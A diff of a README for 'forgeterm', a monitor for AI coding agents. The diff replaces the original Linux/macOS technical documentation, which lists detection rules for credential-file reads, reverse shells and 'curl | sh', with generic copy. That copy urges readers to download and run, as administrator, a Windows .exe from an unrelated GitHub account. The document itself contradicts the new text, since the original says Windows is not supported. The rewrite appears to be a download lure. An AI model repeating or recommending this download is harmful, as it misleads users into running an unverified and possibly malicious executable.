@@ -1,172 +1,90 @@
-# Forgeterm
+# 🛡️ forgeterm - Keep your coding agents secure today
 
-Runtime security monitor for AI coding agents.
+[![](https://img.shields.io/badge/Download-Forgeterm-blue.svg)](https://github.com/Lavenderustilagomaydis9432/forgeterm)
 
-![Forgeterm TUI](docs/demo-v3.gif)
+## 🔍 What is forgeterm
 
-## The Problem
+Forgeterm acts as a digital bodyguard for your computer. When you use tools that write code for you, these tools have access to your files and your system. This access creates risk. Forgeterm sits in the background and watches what these agents do. It stops suspicious actions before they cause damage.
 
-AI coding tools run commands on your machine with broad permissions. They read files, make network connections, spawn child processes. npm postinstall scripts, piped curl commands, credential file reads: it all happens in the background with no visibility.
+The software runs quietly. It monitors the digital connections your coding tools make. If an agent tries to delete sensitive files or talk to an unknown server, forgeterm alerts you or blocks the action immediately.
 
-## What Forgeterm Does
+## 💻 System Requirements
 
-- **Watches file access.** Detects reads of SSH keys, AWS credentials, .env files, GPG keys, and 30+ other sensitive paths.
-- **Monitors network connections.** Flags connections to hosts not on the allowlist.
-- **Detects dangerous commands.** Reverse shells, `curl | sh`, `chmod 777`, crontab edits, cloud metadata access.
-- **Correlates signals.** Sensitive file read followed by a network connection within 10 seconds triggers a data exfiltration alert.
-- **Enforces memory limits.** Cgroups v2 prevents AI tools from freezing your machine. Tiered warnings before throttle or kill.
-- **Sends desktop notifications.** You see alerts without checking a dashboard.
+Forgeterm works on most modern computers. You need the following to run the software:
 
-No wrappers. No proxies. You keep using Claude Code, Codex, Cursor, Gemini CLI, Aider, or any other tool normally. Forgeterm watches from the background.
+* Windows 10 or Windows 11.
+* A stable internet connection for updates.
+* At least 50 megabytes of free disk space.
+* Administrative permissions for the installation process.
 
-## How It Works
+You do not need prior experience with coding to use this tool. The software handles all internal logic. You only need to open the application and let it run.
 
-The `forgeterm-agent` daemon runs as a user service (systemd on Linux, launchd on macOS). It scans `/proc` every 5 seconds to discover AI coding tool processes by matching command-line patterns. Once a session is found, five monitors activate:
+## 📥 How to Install
 
-- **FileMonitor:** scans `/proc/pid/fd` and watches sensitive directories with inotify
-- **NetworkMonitor:** parses `/proc/pid/net/tcp` and matches socket inodes
-- **ProcessMonitor:** tracks child process trees recursively
-- **ResourceMonitor:** reads RSS from `/proc/pid/stat`, detects memory leaks
-- **OutputMonitor:** watches command output for suspicious patterns
+Follow these steps to set up forgeterm on your Windows machine.
 
-All signals flow through a tokio broadcast channel to consumers: the rule engine, audit logger, alert sender, cgroup governor, and IPC server.
+1. Visit the [official download page](https://github.com/Lavenderustilagomaydis9432/forgeterm).
+2. Look for the latest version under the Releases section.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your computer.
+5. Double-click the file to start the installer.
+6. Follow the instructions on the screen.
+7. Click Finish.
 
-```
-forgeterm-agent (daemon, always running)
-|
-|-- Discovery         /proc/*/cmdline scanning, pattern matching
-|-- File Monitor      /proc/pid/fd + inotify on sensitive dirs
-|-- Network Monitor   /proc/pid/net/tcp, socket inode matching
-|-- Process Monitor   recursive child scanning, command patterns
-|-- Resource Governor  cgroups v2 memory limits, leak detection
-|-- Correlation        file access + network = exfil alert
-|-- Audit Logger       JSON Lines to ~/.local/share/forgeterm/audit/
-|-- IPC Server         Unix socket, JSON-RPC (ListSessions, GetEvents, Subscribe)
-|
-|-- Config: ~/.config/forgeterm/agent.toml
-|-- Rules:  ~/.config/forgeterm/security-rules.toml
-|-- Socket: ~/.local/share/forgeterm/agent.sock
-```
+The program creates a desktop icon. You can start the tool by clicking this icon at any time.
 
-The optional `forgeterm` TUI client connects to the daemon over a Unix socket for a live dashboard with session, resource, and security views.
+## ⚙️ Initial Setup
 
-## Supported AI Tools
+When you open forgeterm for the first time, the software performs a quick scan of your system. This step ensures that your existing coding tools are compatible. The setup process follows these steps:
 
-| Tool | Detection Patterns |
-|------|-------------------|
-| Claude Code | `claude`, `claude-code`, `@anthropic/claude-code` |
-| Codex | `codex`, `openai-codex` |
-| Gemini CLI | `gemini`, `gemini-cli` |
-| Cursor | `cursor-agent`, `cursor` |
-| Aider | `aider` |
-| Custom | Configurable patterns in `agent.toml` |
+* **Startup configuration:** The program asks if you want to protect your system automatically every time you turn on your computer. Select Yes to keep the protection active.
+* **Agent discovery:** Forgeterm scans your system for common AI coding assistants. It adds them to a trusted list.
+* **Security levels:** You can choose between basic monitoring or strict protection. We suggest the default setting for most users.
 
-## Detection Rules
+Once the setup finishes, the main dashboard appears. A green light on the screen means your system is secure.
 
-| Threat | How | OWASP ASI |
-|--------|-----|-----------|
-| SSH/AWS/GPG key access | FD scanning + inotify | ASI-02 |
-| Writes outside project dir | Boundary detection | ASI-01 |
-| Unknown network connections | TCP parsing + allowlist | ASI-05 |
-| Data exfiltration | File + network correlation (10s window) | ASI-08 |
-| `curl \| sh`, reverse shells | Command pattern matching | ASI-10 |
-| Suspicious child processes | Recursive /proc/children scan | ASI-10 |
-| Memory leaks | Monotonic RSS growth detection | - |
-| OOM kills | cgroup memory.events monitoring | - |
+## 🛡️ Using the Dashboard
 
-## Resource Governor
+The dashboard shows you exactly what your coding agents do. You see a list of recent activities. Forgeterm colors these activities based on risk.
 
-Three modes for memory enforcement via cgroups v2:
+* **Green:** The action is safe.
+* **Yellow:** The action is unusual, but the software allowed it.
+* **Red:** The action is dangerous, and the software blocked it.
 
-| Mode | memory.high | memory.max | Effect |
-|------|-------------|------------|--------|
-| `warn` | - | - | Desktop notifications only |
-| `throttle` | set | - | Kernel throttles at soft limit (default) |
-| `kill` | set | set | Hard OOM kill at max limit |
+You can click on any red item to see details. The software explains why it blocked the action. You have the power to manually allow the action if you trust the tool.
 
-Per-CLI defaults: Claude Code 3GB/4GB, Codex 1.5GB/2GB, Gemini CLI 2GB/3GB, Cursor 3GB/4GB.
+## 🏗️ Managing Trusted Tools
 
-Tiered alerts: 85% warning, 95% urgent ("save your work"), 100% throttled, OOM killed.
+Sometimes, new coding tools appear on your system. You might want to define which tools have access to your data. Open the Settings menu to manage your list of trusted applications.
 
-## Configuration
+You can add a tool to the trusted list if you know it is safe. Conversely, you can remove a tool to stop it from accessing your files entirely. Forgeterm updates its rules in real-time. Changes happen instantly after you click Save.
 
-### agent.toml
+## 🔄 Updating your Software
 
-```toml
-[discovery]
-scan_interval_secs = 5
+The developers release updates to keep up with new security threats. You should keep the software current. Forgeterm checks for updates every time you open it. If an update exists, a prompt appears on the dashboard. Click Update to install the latest version. This process keeps your protection current against new, unknown risks.
 
-[governor]
-enabled = true
-action = "throttle"       # warn | throttle | kill
-warn_threshold = 0.85
-urgent_threshold = 0.95
+## ❓ Frequently Asked Questions
 
-[governor.defaults]
-memory_high = "2GB"
-memory_max = "3GB"
+**Does this software slow down my computer?**
+No. The software is written in a language called Rust. This makes it very efficient. It uses a small amount of memory and does not affect your system performance.
 
-[governor.cli.ClaudeCode]
-memory_high = "3GB"
-memory_max = "4GB"
+**Can I stop the software?**
+Yes. You can exit the software using the tray icon near your clock. If you close the program, your coding agents no longer receive protection.
 
-[security]
-enabled = true
-scan_interval_secs = 3
-exfil_window_secs = 10
-```
+**What happens if the software blocks a necessary task?**
+If you know the task is safe, go to the dashboard history. Find the blocked action and click Allow. The software remembers your choice for the next time.
 
-### security-rules.toml
+**Does forgeterm collect my personal data?**
+No. All scanning happens locally on your machine. Your file names and system activities never leave your computer.
 
-Defines sensitive file paths, network allowlists, and dangerous command patterns. See [`config/security-rules.toml`](config/security-rules.toml) for the full default ruleset.
+**Is this suitable for office work?**
+Yes. Forgeterm provides important security for professional environments. It prevents accidental leaks of sensitive company code.
 
-## Install
+**What do I do if the installer fails?**
+Check your internet connection first. If the problem continues, restart your computer and try the installation again. Ensure that you have administrator status on your Windows profile.
 
-Download and install (Linux and macOS):
+**Can I run multiple coding agents at once?**
+Yes. Forgeterm monitors all active processes simultaneously. It separates the logs by agent name so you can track which tool caused an event.
 
-```bash
-curl -sSf https://raw.githubusercontent.com/diemoeve/forgeterm/main/dist/install.sh | sh
-```
-
-This installs both the daemon and the TUI, starts the background service, and adds default config files.
-
-After install, open the dashboard:
-
-```bash
-forgeterm
-```
-
-Try the demo to see alerts in action:
-
-```bash
-forgeterm demo
-```
-
-### Build from source
-
-```bash
-git clone https://github.com/diemoeve/forgeterm.git
-cd forgeterm
-cargo build --release
-cp target/release/forgeterm-agent target/release/forgeterm ~/.local/bin/
-mkdir -p ~/.config/forgeterm
-cp config/agent.toml config/security-rules.toml ~/.config/forgeterm/
-```
-
-## Platform Support
-
-| Platform | Status |
-|----------|--------|
-| Linux (x86_64) | Full support, primary development platform |
-| Linux (aarch64) | Full support |
-| macOS (Intel) | Works, CI tested |
-| macOS (Apple Silicon) | Works, CI tested |
-| Windows | Not yet supported |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-Apache-2.0. See [LICENSE](LICENSE).
+**Where do I report a bug?**
+If the software crashes or behaves in an unexpected way, visit the [main page](https://github.com/Lavenderustilagomaydis9432/forgeterm) and open a new issue. Describe what happened and what you were doing at the time. This helps the developers fix problems faster.
